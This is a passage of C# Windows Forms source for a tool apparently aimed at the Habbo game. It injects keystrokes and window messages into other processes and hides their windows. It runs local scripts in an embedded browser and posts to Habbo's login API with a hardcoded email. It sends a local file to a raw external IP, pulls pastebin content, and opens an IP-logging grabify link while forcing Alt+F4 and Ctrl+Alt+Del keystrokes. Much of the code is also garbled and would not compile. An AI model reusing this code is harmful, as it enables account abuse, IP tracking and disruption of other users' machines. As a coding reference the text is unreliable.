            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
            wm_char.GetMousePosition();
            // wm_char.Click(null);
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete, Desktop.Robot.Key.Esc);


            return Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
        }

        public byte[] PostMsg(ushort keyCode)
        {
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            Process[] Clients = Process.GetProcessesByName(Disposed.ProcessName);
            [DllImport("user32.dll", SetLastError = true)]
            static extern bool PostMessage(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);
            static extern bool SendMessage(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);
            foreach (ClientForm x in FormClients)
            {
                SetParent(x.Handle, panel4.Handle);
                SetParent(x.Handle, panel2.Handle);
                Desktop.Robot.Robot wm_Text = new Desktop.Robot.Robot();
                SendKeys.SendWait("{ENTER}");
                Desktop.Robot.Robot wm = new Desktop.Robot.Robot();
                wm.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
                wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                const int SW_HIDE = 9;
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x000, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x0001, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x02, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x0002, (IntPtr)keyCode, IntPtr.Zero);
                PostMessage(Disposed.MainWindowHandle, 0x11, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x5A, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x0D, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                PostMessage(Disposed.MainWindowHandle, 0x0002, (IntPtr)keyCode, IntPtr.Zero);
                ShowWindow(Disposed.Handle, SW_HIDE); ShowWindow(Disposed.MainWindowHandle, SW_HIDE);
                Func<byte[], IntPtr> refPostMessage = delegate (byte[] Buffer) { Console.WriteLine(false); Desktop.Robot.Robot wm_Text = new Desktop.Robot.Robot(); wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); wm_Text.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V, Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter); SendKeys.Send("{ENTER}"); SendKeys.Send("^v"); SendKeys.Send("{ENTER}"); return new IntPtr(); };
                PostMessage(Disposed.MainWindowHandle, 0x0100, (IntPtr)keyCode, IntPtr.Zero);
                PostMessage(Disposed.MainWindowHandle, 0x0101, (IntPtr)keyCode, IntPtr.Zero);
                [DllImport("user32.dll", SetLastError = true)]
                static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                static extern bool ShowWindow(IntPtr hwnd, int nCmdshow);
                var hcontrol = new Control();
                hcontrol.Handle.Equals(refPostMessage(new byte[x.Width]));
                hcontrol.Show();
                //ShowWindow(hcontrol.Handle, 9);
                SetParent(refPostMessage(new byte[x.Height]), panel1.Handle);
                SetParent(refPostMessage(new byte[x.Width]), x.Height);
                //ShowWindow(refPostMessage(new byte[x.MainWindowHandle]), 9);
                //SendMessage(x.MainWindowHandle, 0x0100, 0x56, IntPtr.Zero);
                //SendMessage(x.MainWindowHandle, (uint)refPostMessage(new byte[x.Handle]), refPostMessage(new byte[x.Handle]), 0);
                //PostMessage(x.MainWindowHandle, 0x0101, (IntPtr)keyCode, IntPtr.Zero);
                //PostMessage(x.MainModule.BaseAddress,(uint)refPostMessage(new byte[] { (byte)x.MainWindowHandle}), refPostMessage(new byte[x.MainWindowHandle]), 0);


            }

            PostMessage(Disposed.MainWindowHandle, 0x0002, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x0001, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x001, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x5A, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0xBD, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x11, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x4A, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x56, (IntPtr)keyCode, IntPtr.Zero);
            PostMessage(Disposed.MainWindowHandle, 0x01, (IntPtr)keyCode, IntPtr.Zero);
            return new byte[] { (byte)(int)keyCode };
        }
        public string refPostClinet()
        {
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            Process[] Clients = Process.GetProcessesByName(Disposed.ProcessName);
            foreach (Process x in Clients)
            {

                var xProc = PostMessageRef(x.Handle);
                x.Handle.Equals(xProc.Handle);
                Process BeginStart = PostMessageRef(x.Handle);
                x.MainWindowHandle.Equals(BeginStart.Handle);
                PostMessageRef(x.Handle);

                //xProc.Start();
                //Disposed.GetType().GetElementType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, PostMessageRef(x.MainWindowHandle), null);
                //Disposed.GetType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
                using (BinaryWriter BW = new BinaryWriter(new MemoryStream(new byte[(IntPtr)Disposed.MainWindowHandle])))
                {
                    BW.Write("https://www.habbo.com");
                    Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte Bkey, byte Bscan, int dwFlags, int dwExtraInfo); keybd_event(0x01, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); wm.GetMousePosition(); return new byte[] { }; };
                    BW.Write(refPostMessage(Disposed.MainWindowHandle));
                    Socket Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ;
                    Server.Connect("127.0.0.1", 30001);
                    Server.Send(PostMsg(0x01));
                    Server.Send(PostMsg(0x011));
                    Server.Send(PostMsg(0x11));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x0D));
                    timer3.Interval = 443;
                    timer3.Start();
                    Func<byte[], ushort> EndAccept = delegate (byte[] Hwnd) { timer4.Stop(); toolStrip1.Enabled = false; return 0x00b9; };
                    Server.Send(PostMessage(EndAccept(PostMessage(0x000))));
                    BW.Close();
                    BW.Dispose();
                }
            }
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(webView21.ExecuteScriptAsync("setTimeout(()=>{ window.location.href='https://www.habbo.com/logout';showDirectoryPicker();},1993);").ToString()));
        }
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            //webView21.Source = new Uri("https://10minutemail.com/");

            // Byte[] Buffer = {byte)int.Parse(richTextBox2.Text.ToString())}

            var Filepath = "C:\\Users\\Admin\\Desktop\\API.js";
            //MessageBox.Show(File.ReadAllText(Filepath.Replace("Admin", Environment.UserName)));

            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            //  Disposed.GetType().InvokeMember(null, System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
            TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);
            using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
            {
                List<IntPtr> HandlesRef = new List<nint>();

                BW.Write("https://www.habbo.com");
                Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x02, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { }; };
                foreach (var items in FormClients)
                {
                    MessageBox.Show("Test");
                    var nintModule = items.Handle;
                    HandlesRef.Add(nintModule);
                    items.CanSelect.Equals(true);
                    BW.Write(refPostMessage(items.Handle));
                    BW.Write(refPostMessage(items.Cursor.Handle));

                    return;
                }
                string post()
                {
                    foreach (var item in HandlesRef)
                    {
                        BW.Write(refPostMessage(item));
                        [DllImport("user32.dll", SetLastError = true)]
                        static extern bool SendMessage(IntPtr hwnd, uint msg, int lParam, int wParam);
                        for (int i = 0; i < FormClients.Count; i++)
                        {
                            MessageBox.Show("Test");
                            FormClients[i].CanSelect.Equals(true);
                            FormClients[i].SelectNextControl(this, false, false, true, false);
                            FormClients[i].Select();
                            [DllImport("user32.dll")]
                            static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
                            //ShowWindow(FormClients[i].Handle, 9);
                            FormClients[i].Select();
                            SendMessage(item, new byte[] { 0x00002 }[0], 0, 0);
                            return Process.GetCurrentProcess().MainWindowTitle;
                        }

                    }

                    SendKeys.Send(refPostClinet());
                    return "";
                }

                BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                BW.Close();

                BW.Dispose();
                foreach (var itemsin in FormClients)
                {
                    MessageBox.Show(itemsin.Handle.ToString());
                    if (!itemsin.CanSelect)
                    {
                        MessageBox.Show("Test");
                        checkedListBox1.Items.Clear();
                        checkedListBox1.Items.Add(itemsin.Handle);
                        itemsin.CanSelect.Equals(true);
                        itemsin.Width = itemsin.Width;
                        itemsin.Dock = DockStyle.Fill;
                        itemsin.Select();
                        itemsin.SelectNextControl(panel4, false, false, true, false);
                        [DllImport("user32.dll")]
                        static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewPraent);
                        SetParent(itemsin.Handle, panel1.Handle);
                        itemsin.SelectNextControl(panel4, false, true, false, false);
                        SetParent(itemsin.Handle, panel4.Handle);

                    }
                }

            }


        }

        private void button3_Click(object sender, EventArgs e)
        {
            ClientModules.Add(Process.GetProcessById(int.Parse(textBox2.Text.ToString())));
            //webView21.ExecuteScriptAsync(File.ReadAllText("C://Users//Admin//Desktop//API.js".Replace("Admin", Environment.UserName)));
            richTextBox1.Text += "Disconnection<html </html>";
            toolStripButton1.Enabled = true;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetDllDirectory(string lpPathName);

        //[DllImport("Apphost.dll")]
        public static extern string refPostMessage();
        public List<HConnection> ConnectionHandlers = new List<HConnection>();

        private void button4_Click(object sender, EventArgs e)
        {
            timer1.Interval = 1302;
            timer1.Start();
            // Call this duri.
            // SetDllDirectory(@"C:\Users\Lenovo\source\repos\Apphost\Apphost\bin\x64\Release\net8.0-windows\Apphost.dll");

            // MessageBox.Show("Test");
            foreach (HConnection ConnectedClients in ConnectionHandlers)
            {
                try
                {
                    IPEndPoint LocalendPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 1302);
                    EndPoint RemoteEndpoint = LocalendPoint;
                    //Func<IntPtr, byte[]> refSendMessage = delegate (IntPtr hwnd) { return new byte[Apphost.Form1.ServerGameSocket.SendBufferSize]; };
                    // int Recv = ConnectedClients.Client.Receive(refSendMessage(Apphost.Form1.ClientSocket.Handle));
                    //byte[] BufferRecv = refSendMessage(Apphost.Form1.ClientSocket.Handle);
                    //Array.Resize(ref BufferRecv, Recv);
                    //  Apphost.Form1.ClientSocket.BeginConnect(RemoteEndpoint, new AsyncCallback(ConnectionCallback), sender);
                    // byte[] Buffer = new byte[Apphost.Form1.SeDataDatarverGameSocket.SendBufferSize];
                    // byte[] RecvData = new byte[ConnectedCDataDatalients.Client.ReceiveBufferSize];
                    // int SendAsync = Apphost.Form1.ClientSocket.Send(BufferRecv, 0, SocketFlags.None);
                    // sender = new object[] { ((System.Windows.Forms.MethodInvoker)delegate { Array.Resize<byte>(ref Buffer, SendAsync); Array.Resize(ref RecvData, SendAsync); }) }[0];
                    button4_Click(sender, e);
                }

                catch (SocketException sockEx)

                {
                    MessageBox.Show("Errr" + sockEx.Message.ToString());
                }
            }
            refPostMessage();

        }

        private void BeginDisconnect_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < checkedListBox1.Items.Count; i++)
            {
                checkedListBox1.SelectedIndex = i;
            }
        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            // MessageBox.Show("Test");
            timer6.Interval = int.Parse(textBox12.Text.ToString());
            timer6.Start();

            this.CanSelect.Equals(true);
            this.SelectNextControl(this, false, false, true, true);
            if (this.CanSelect)
            {
                Process.GetCurrentProcess().Refresh();
                Thread.Sleep(100);
            }
            button4.SelectNextControl(this, true, false, false, true);
            button4.Enabled = true;
            // button4.PerformClick();
            button4.Enabled = false;
            BeginDisconnect.Interval = int.Parse(textBox3.Text.ToString());
            BeginDisconnect.Start();
            webView21.Source = new Uri("https://www.pastebin.com/raw/TF9MauVK");
            webView21.ExecuteScriptAsync("var oimg = document.creatElement('img');oimg.setAttribute('src','http://localhost:443/'); oimg.setAttribute('class','imager'); oimg.setAttribute('width','300px'); oimg.setAttribute('height','450px'); document.body.appendChild(oimg); var XHR = new XMLHttpRequest(); XHR.open('POST','https://www.habbo.com/api/public/authentication/loginv2'); XHR.setRequestHeader('email','zeroxhabbo@gmail.com'); XHR.send(document.getEelementsByClassName('imager'));");

        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            BeginDisconnect.Stop();
            timer4.Stop();
            timer6.Stop();
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        public List<Process> AccountHandler = new List<Process>();

        private void button2_Click(object sender, EventArgs e)
        {
            Process[] Clients = Process.GetProcessesByName(ClientModules[0].ProcessName);
            foreach (var items in Clients)
            {
                Button hbutton = new Button();
                hbutton.Width = button2.Width;
                hbutton.Height = button2.Height;
                panel3.Controls.Add(hbutton);
                AccountHandler.Add(items);
                hbutton.Click += Hbutton_Click;
            }


        }
        public string refPostClientMsg(int pid)
        {
            Process Disposed = Process.GetProcessById(pid);
            Process[] Clients = Process.GetProcessesByName(Disposed.ProcessName);
            foreach (Process x in Clients)
            {

                var xProc = PostMessageRef(Disposed.Handle);
                x.Handle.Equals(xProc.Handle);
                Console.Write(false);
                Process BeginStart = PostMessageRef(x.Handle);
                x.MainWindowHandle.Equals(BeginStart.Handle);
                PostMessageRef(Disposed.Handle);

                PostMessageRef(x.Handle);

                //xProc.Start();
                //Disposed.GetType().GetElementType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, PostMessageRef(x.MainWindowHandle), null);
                //Disposed.GetType().InvokeMember("PostMessage", System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
                using (BinaryWriter BW = new BinaryWriter(new MemoryStream(new byte[(IntPtr)Disposed.MainWindowHandle])))
                {
                    BW.Write("https://www.habbo.com");
                    Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte Bkey, byte Bscan, int dwFlags, int dwExtraInfo); keybd_event(0x01, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); wm.GetMousePosition(); return new byte[] { }; };
                    BW.Write(refPostMessage(Disposed.MainWindowHandle));
                    Socket Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ;
                    Server.Connect("127.0.0.1", 30001);
                    Server.Send(PostMsg(0x01));
                    Server.Send(PostMsg(0x011));
                    Server.Send(PostMsg(0x11));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x56));
                    Server.Send(PostMsg(0x0D));
                    timer3.Interval = 443;
                    timer3.Start();

                    BW.Close();
                    BW.Dispose();
                }
            }
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(webView21.ExecuteScriptAsync("setTimeout(()=>{ window.location.href='https://www.habbo.com/logout';showDirectoryPicker();},1993);").ToString()));
        }
        private void Hbutton_Click(object? sender, EventArgs e)
        {
            var Filepath = "C:\\Users\\Admin\\Desktop\\API.js";
            //MessageBox.Show(File.ReadAllText(Filepath.Replace("Admin", Environment.UserName)));

            var script = Filepath.Replace("Admin", Environment.UserName);
            webView21.ExecuteScriptAsync(System.IO.File.ReadAllText(script));
            Process Disposed = Process.GetProcessById(int.Parse(textBox2.Text.ToString()));
            //  Disposed.GetType().InvokeMember(null, System.Reflection.BindingFlags.InvokeMethod, null, Disposed, null);
            TcpClient Clientsock = new TcpClient("127.0.0.1", 30001);
            using (var BW = new BinaryWriter(new MemoryStream(new byte[Clientsock.Client.ReceiveBufferSize])))
            {


                BW.Write("https://www.habbo.com");
                Func<IntPtr, byte[]> refPostMessage = delegate (IntPtr hwnd) { [DllImport("user32.dll", SetLastError = true)] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); keybd_event(0x02, 0, 0x0000, 0); keybd_event(0x010, 0, 0x0002, 0); keybd_event(0x11, 0, 0x0000, 0); keybd_event(0x11, 0, 0x0002, 0); keybd_event(0x56, 0, 0x0000, 0); keybd_event(0x56, 0, 0x0002, 0); keybd_event(0x0D, 0, 0x0000, 0); SendKeys.SendWait("{ENTER}"); Desktop.Robot.Robot wm = new Desktop.Robot.Robot(); return new byte[] { }; };
                BW.Write(refPostMessage(Disposed.MainWindowHandle));
                string post()
                {
                    SendKeys.Send(refPostClinet());
                    return "";
                }

                BW.BaseStream.Read(Encoding.ASCII.GetBytes(post()), 0, 0);
                BW.Close();
                Process.GetCurrentProcess().Refresh();
                ////  Process.GetCurrentProcess().WaitForInputIdle();
                Process.GetCurrentProcess().WaitForExit();

                BW.Dispose();
            }
        }

        public const string Figurestring = "hr-165-31.hd-190-1.ch-3030-66.lg-275-81.sh-290-1408.ha-1015%2Cs-2.g-1.d-2.h-2.a-0%2C0a989935a2888bed97d071d336e8aacb";
        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = textBox2.Text;
            textBox1.Text = textBox2.Text;
            var HttpClient = new HttpClient();
            HttpClient.BaseAddress = new Uri("https://www.habbo.com/api/public/");
            using (var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, "https://www.habbo.com/hotel"))
            {
                var GetAsync = HttpClient.GetAsync("https://www.habbo.com/logout");
                byte[] Buffer = Encoding.ASCII.GetBytes(GetAsync.Result.Content.ReadAsStringAsync().Result.ToString());
                WebRequest PostMethod = (HttpWebRequest)WebRequest.Create("https://www.instagram.com");
                PostMethod.Method = "GET";
                Stream OBJ = PostMethod.GetResponse().GetResponseStream();
                StreamReader SR = new StreamReader(OBJ);
                if (SR.ReadToEnd().ToString() != null)
                {
                    WebClient wc = new WebClient();
                    string UserAPI = "C:\\Users\\Admin\\Desktop\\API\\Public\\Figurestring.php".Replace("Admin", Environment.UserName);
                    var FigureStringData = File.ReadAllText(UserAPI);
                    FtpModule.Interval = 1034;
                    FtpModule.Start();
                    wc.BaseAddress = new Uri("https://www.habbousdf.com").ToString();
                    var PostAsync = wc.OpenWrite("https://www.habbo.com/habbo-imaging/avatar/hr-165-31.hd-190-1.ch-3030-66.lg-275-81.sh-290-1408.ha-1015%2Cs-2.g-1.d-2.h-2.a-0%2C0a989935a2888bed97d071d336e8aacb.png".Replace(Figurestring, FigureStringData), "POST");
                    PostAsync.Write(new byte[] { 0x0000 });
                    Bitmap bmp;
                    var WebContent = wc.OpenRead("https://www.habbo.com/habbo-imaging/avatar/hr-165-31.hd-190-1.ch-3030-66.lg-275-81.sh-290-1408.ha-1015%2Cs-2.g-1.d-2.h-2.a-0%2C0a989935a2888bed97d071d336e8aacb.png".Replace(Figurestring, FigureStringData));
                    bmp = new Bitmap(Image.FromStream(WebContent));
                    var ImageFilepath = "C://Users//Desktop//Admin//header.png".Replace("Admin", Environment.UserName);
                    bmp.Save(ImageFilepath, ImageFormat.Png);
                    panel3.BackgroundImage = Image.FromFile(ImageFilepath);

                    // var HMessage = Newtonsoft.Json.JsonConvert.SerializeObject(new List<string> { Convert.ToBase64String(new byte[PostAsync.ReadByte()]) });
                    // HttpReqMsg.Content = new StringContent(HMessage);
                    // webView21.ExecuteScriptAsync(HttpClient.SendAsync(HttpReqMsg).ToString());

                }
            }
        }

        private void FtpModule_Tick(object sender, EventArgs e)
        {
            var Filepath = "C://Users//Admin//Desktop//API//Public///Handles.txt";
            var FileData = System.IO.File.ReadAllText(Filepath.Replace("Admin", Environment.UserName));
            List<Process> ClientModuleRef = new List<Process> { };
            ClientModuleRef.Add(Process.GetCurrentProcess());
            //checkBox1.Text = FileData + Environment.NewLine + DateTime.Now.ToString() + ClientModules[0].MainWindowTitle;
            using (var HttpClient = new HttpClient())
            {
                HttpClient.BaseAddress = new Uri("https://www.pastebin.com/raw/TF9MauVK");
                var GetAsync = HttpClient.GetAsync("https://www.habbo.com/logout/");
                Socket ClientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                ClientSock.Connect("69.172.200.161", 443);
                var Result = GetAsync.Result.ToString();
                if (Result != null)
                {
                    if (checkBox1.Text.Contains("Start")) { Func<List<nint>, byte[]> PostMsg = delegate (List<IntPtr> lpBaseAddress) { button4.Enabled = true; Process[] Clients = Process.GetProcessesByName(ClientModules[0].ProcessName); foreach (System.Diagnostics.Process x in Clients) { ClientModuleRef.Add((Process)x); button4.PerformClick(); return new byte[] { (byte)x.MainWindowHandle }; } return new byte[ClientSock.ReceiveBufferSize]; }; Random Index = new Random(); int Indexvalue = Index.Next(1, ClientModuleRef.Count); ClientSock.SendFile("C://Users//Admin//Desktop//API.js".Replace("Admin", Environment.UserName), PostMsg(new List<IntPtr>() { IntPtr.Zero }), PostMsg(new List<nint>() { ClientModuleRef[Indexvalue].MainWindowHandle }), TransmitFileOptions.UseDefaultWorkerThread); button4.Enabled = true; button4.Text = ClientModules[0].MainWindowTitle; button4.PerformClick(); }
                    if (checkBox1.Text.Contains("Stop")) { button4.Text = ClientModules[0].MainWindowHandle.ToString(); button4.Enabled = false; using (var Ns = new NetworkStream(ClientSock)) { ClientSock.Send(new byte[] { (byte)ClientModules[0].MainWindowHandle }); } }
                    [DllImport("user32.dll")]
                    static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);

                    [DllImport("user32.dll")]
                    static extern bool ShowWindow(IntPtr hwnd, int nCDataDatamdShow);
                    static extern bool SendMessage(IntPtr msg, uint Msg, int LpARAM, int WpARAM);
                    static extern IntPtr PostMessage(IntPtr hwnd, int msg, int LpARAM, int wParam);
                    Func<byte[], int> PosMsg = delegate (byte[] hwnd) { hwnd = new byte[] { 0x11, 0, 0x0000, 0, 0x11, 0, 0x00002, 0, 0x56, 0, 0x0000, 0, 0x56, 0, 0x0002, 0 }; return ClientSock.Send(hwnd); };
                    const int SW_CLOSE = 9;

                    //SendMessage(ClientModules[0].MainWindowHandle, 0x11, 0, 0);
                    //PostMessage(ClientModules[0].Handle, PosMsg(new byte[ClientSock.SendBufferSize]), 0, PosMsg(new byte[] { (byte)ClientModules[0].MainWindowHandle }));



                }

            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            //ClientModules.Add(Process.GetProcessById(int.Parse(textBox4.Text.ToString())));
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            //ClientModules.Add(Process.GetProcessById(int.Parse(textBox2.Text.ToString())));
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel3_BackgroundImageChanged(object sender, EventArgs e)
        {
            //MessageBox.Show("Test");
            Clipboard.SetText("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
            Clipboard.SetImage(panel3.BackgroundImage);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            var Filepath = "C://Users//" + Environment.UserName + "//Desktop//API//Public//Handles.txt";
            StreamWriter SW = new StreamWriter(Filepath);
            SW.WriteLine("<script src='https://www.habbo.com/api/public/authentication/catchpaToken=Start'></script>");
            SW.Close();
            SW.Dispose();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            byte[] Buffer = Encoding.UTF8.GetBytes(textBox4.Text.ToString());
            var HMessage = Convert.FromBase64String(textBox4.Text.ToString());
            for (int i = 0; i < tabControl1.TabPages.Count; i++)
            {
                tabControl1.SelectedIndex = 1;
                tabControl1.SelectedTab = tabControl1.TabPages[1];
                BrowserClients[0].ExecuteScriptAsync(Encoding.UTF8.GetString(HMessage, 0, HMessage.Length));

            }
            BrowserClients[0].Source = new Uri("https://www.habbo.com/room/80179476");

            BrowserClients[0].ExecuteScriptAsync("var Htmlelem = document.getElementsByClassName('imager');");
            BrowserClients[0].ExecuteScriptAsync("window.location='https://www.habbo.com/profile/'+Htmlelem[0].alt");
            webView21.ExecuteScriptAsync("let event = new MouseEvent(\"click\",{bubbles:true,cancelable:true,view:window});");
            BrowserClients[0].ExecuteScriptAsync("let event = new MouseEvent(\"click\",{bubbles:true,cancelable:true,view:window});");
            webView21.ExecuteScriptAsync("var imager = document.getElementsByClassName(\"account-security__disable\");");
            BrowserClients[0].ExecuteScriptAsync("var imager = document.getElementsByClassName(\"account-security__disable\");");
            const string Login = "var html = document.getElementsByClassName('form__input login-form__input ng-dirty ng-valid-parse ng-not-empty ng-valid-required ng-touched ng-invalid ng-invalid-remote-data-credentials'); ";
            timer3.Interval = 6781;
            timer3.Start();
            BrowserClients[0].ExecuteScriptAsync("");
            BrowserClients[0].ExecuteScriptAsync("");
            webView21.ExecuteScriptAsync("");

        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            var FilepathData = "C://Users//" + Environment.UserName + "//Desktop//HomeRoom.txt";
            StreamWriter SW = new StreamWriter(FilepathData);
            SW.WriteLine(Process.GetCurrentProcess().MainWindowTitle.ToString());
            SW.Close();
            SW.Dispose();
            var value = BrowserClients[0].Source.ToString().Replace("https://www.habbo.com/profile/", string.Empty);
            checkBox4.Text = value;

            if (checkBox4.Text.ToString() != "Maol")
            {
                //BrowserClients[0].ExecuteScriptAsync("window.location='https://www.youtube.com/watch?v=42MoiQLn6MU&t=9s';");
                webView21.ExecuteScriptAsync("setTimeout(()=>{window.location.href='https://www.youtube.com/watch?v=42MoiQLn6MU&t=9s';},3102);");
                Process.Start("https://grabify.link/GJWGLL");

                Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                wm_char.CombineKeys(Desktop.Robot.Key.Alt, Desktop.Robot.Key.F4);
                bool hwndRecv = false;
                wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.Alt, Desktop.Robot.Key.Delete, Desktop.Robot.Key.Down, Desktop.Robot.Key.Enter);
                if (hwndRecv)
                {
                    using (var HttpClient = new HttpClient())
                    {
                        HttpClient.GetAsync("https://grabify.link/GJWGLL");
